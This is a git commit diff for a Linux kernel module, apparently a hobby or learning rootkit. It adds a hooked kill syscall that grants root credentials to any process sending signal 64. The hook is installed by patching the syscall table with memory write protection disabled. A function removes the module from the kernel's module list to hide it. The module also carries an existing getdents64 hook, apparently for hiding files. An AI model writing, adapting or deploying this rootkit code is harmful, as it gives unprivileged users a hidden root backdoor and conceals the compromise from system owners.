396686291e3f9292dce94a7930ac4bdebcf2b174
Prime Tony <tonyprime2012@gmail.com>
2023-10-31 17:41:27 +0100

    new: hook kill to give root perms

--- modules/hacking2600Module/hacking2600Module.c
+++ modules/hacking2600Module/hacking2600Module.c
@@ -4,6 +4,14 @@
 #include <asm/special_insns.h>
 #include <asm/processor-flags.h>
 #include <linux/dirent.h>  // For struct linux_dirent64
+#include <linux/cred.h>
+
+#ifdef MODULE
+extern struct module __this_module;
+#define THIS_MODULE (&__this_module)
+#else
+#define THIS_MODULE ((struct module *)0)
+#endif
 
 MODULE_LICENSE("GPL");
 
@@ -15,6 +23,47 @@ typedef int (*sysfun_t)(struct pt_regs *);
 
 static kallsyms_lookup_name_t lookup_name = NULL;
 static sysfun_t original_getdents64 = NULL;
+static sysfun_t original_kill = NULL;
+
+void set_root(void)
+{
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    commit_creds(root);
+}
+
+// Hook kill to give root permissions with a special number : 64
+// ex: kill -64 1
+asmlinkage int new_kill(const struct pt_regs *regs)
+{
+    void set_root(void);
+
+    int sig = regs->si;
+
+    if (sig == 64)
+    {
+        printk(KERN_INFO "rootkit: giving root...\n");
+        set_root();
+        return 0;
+    }
+
+    return original_kill(regs);
+}
+
+// Hide from /proc/modules
+void hidelsmod(void)
+{
+    list_del(&THIS_MODULE->list);
+}
 
 void cr0_write(unsigned long val)
 {
@@ -73,7 +122,7 @@ static inline void protect_memory(unsigned long original_cr0)
     native_write_cr0(original_cr0);
 }
 
-static int __init hidefile_init(void)
+static int __init hacking_init(void)
 {
     // kprobe kallsyms_lookup_name function
     uint64_t *syscall_table = NULL;
@@ -99,17 +148,20 @@ static int __init hidefile_init(void)
 
     // saved old syscalls
     original_getdents64 = (sysfun_t) syscall_table[__NR_getdents64];
+    original_kill = (sysfun_t) syscall_table[__NR_kill];
 
     // setup new syscalls
     // disable writing memory protection temporarily 
     unsigned long original_cr0 = unprotect_memory();
     syscall_table[__NR_getdents64] = (uint64_t) new_getdents64;
+    syscall_table[__NR_kill] = (uint64_t) new_kill;
+    hidelsmod();
     protect_memory(original_cr0);
 
     return 0;
 }
 
-static void __exit hidefile_exit(void)
+static void __exit hacking_exit(void)
 {
     // reset old syscalls
     uint64_t *syscall_table = (uint64_t *) lookup_name("sys_call_table");
@@ -121,5 +173,5 @@ static void __exit hidefile_exit(void)
     }
 }
 
-module_init(hidefile_init);
-module_exit(hidefile_exit);
+module_init(hacking_init);
+module_exit(hacking_exit);
